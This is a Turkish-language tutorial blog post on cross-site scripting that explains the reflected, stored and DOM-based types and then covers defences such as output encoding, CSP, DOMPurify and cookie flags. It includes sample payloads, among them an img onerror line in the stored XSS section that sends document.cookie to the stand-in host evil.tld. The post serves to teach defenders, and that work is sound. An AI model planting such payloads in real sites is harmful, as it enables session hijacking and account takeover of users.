---
title: "XSS (Cross-Site Scripting): Türleri, Örnekleri ve Korunma"
date: 2026-06-25 10:00:00 +0300
tags: [xss, web-security, siber-guvenlik, owasp]
author: CyEn07
---

**Cross-Site Scripting (XSS)**, bir saldırganın başka kullanıcıların
tarayıcısında çalışacak kötü niyetli JavaScript enjekte edebildiği, web
uygulamalarının en yaygın zafiyetlerinden biridir. Temel sebep tektir:
**kullanıcıdan gelen veri, çıktı üretilirken güvenli şekilde kodlanmadan
(escape/encode) HTML'e basılır.**

> Aşağıdaki örnekler yalnızca kendi test ortamında veya yazılı izinli
> sistemlerde denenmelidir. Amaç zafiyeti anlamak ve kapatmaktır.

## XSS Türleri

### 1. Reflected (Yansıyan) XSS

Enjekte edilen kod, sunucudan gelen yanıtta anında "yansır". Genellikle URL
parametresi üzerinden tetiklenir:

```
https://site.com/ara?q=<script>alert(document.cookie)</script>
```

Eğer sunucu `q` değerini arama sonuç sayfasına doğrudan basıyorsa, script
çalışır. Kurban, hazırlanmış bir bağlantıya tıkladığında istismar gerçekleşir.

### 2. Stored (Kalıcı) XSS

Enjekte edilen kod veritabanına kaydedilir ve sonradan sayfayı açan **her
kullanıcıya** sunulur. En tehlikeli türdür — örneğin bir yorum alanına:

```html
<img src=x onerror="fetch('https://evil.tld/c?'+document.cookie)">
```

Bu yorumu gören herkesin oturum çerezi saldırgana gider.

### 3. DOM-based XSS

Zafiyet sunucuda değil, tamamen istemci tarafı JavaScript'tedir. Sayfa,
kullanıcı girdisini güvensiz bir "sink"e yazar:

```javascript
// Tehlikeli: URL'deki hash'i dogrudan DOM'a basmak
document.getElementById("out").innerHTML = location.hash.slice(1);
```

`https://site.com/#<img src=x onerror=alert(1)>` ile tetiklenir.

## Neden Tehlikeli?

XSS ile saldırgan kurbanın tarayıcı bağlamında şunları yapabilir:

- Oturum çerezlerini / token'ları çalmak (hesap ele geçirme)
- Kullanıcı adına işlem yapmak (CSRF korumasını bile atlatarak)
- Sayfayı değiştirip sahte login formu göstermek (phishing)
- Keylogger yerleştirmek, tarayıcı içi verileri sızdırmak

## Korunma Yöntemleri

### Çıktı Kodlaması (En Temel Savunma)

Veriyi hangi bağlamda basıyorsan ona uygun encode et:

- HTML gövdesi → HTML entity encode (`<` → `&lt;`)
- HTML attribute → attribute encode + tırnak
- JavaScript bağlamı → JS string encode
- URL → URL encode

Modern framework'ler (React, Angular, Vue) varsayılan olarak encode eder;
tehlike genellikle `dangerouslySetInnerHTML`, `v-html`, `innerHTML` gibi
kaçış yollarındadır.

### Content Security Policy (CSP)

Inline script'leri ve dış kaynakları kısıtlayan bir savunma katmanı:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

CSP tek başına yeterli değildir ama başarılı bir enjeksiyonun etkisini ciddi
şekilde sınırlar.

### Girdi Doğrulama ve Sanitizasyon

Zengin metin (HTML) kabul etmen gerekiyorsa, güvenli bir kütüphane kullan
(ör. **DOMPurify**). Kendi regex "temizleyicini" yazma — neredeyse her zaman
atlatılır.

### Diğer Önlemler

| Önlem | Faydası |
|---|---|
| `HttpOnly` çerez | JS'in `document.cookie` ile token okumasını engeller |
| `SameSite` çerez | Çerezin çapraz sitede gönderilmesini kısıtlar |
| Framework auto-escaping | Varsayılan güvenli çıktı |
| CSP | Enjeksiyonun etkisini sınırlar |

## Özet

XSS'in kökeni "veri" ile "kod"un karışmasıdır. Çözüm de bu ikisini net
ayırmaktır: **her kullanıcı girdisini, çıktı bağlamına uygun şekilde encode
et.** Framework'ünün otomatik kaçış mekanizmalarına güven, onları
`innerHTML` benzeri yollarla baypas etmekten kaçın ve CSP ile derinlemesine
savunma uygula.
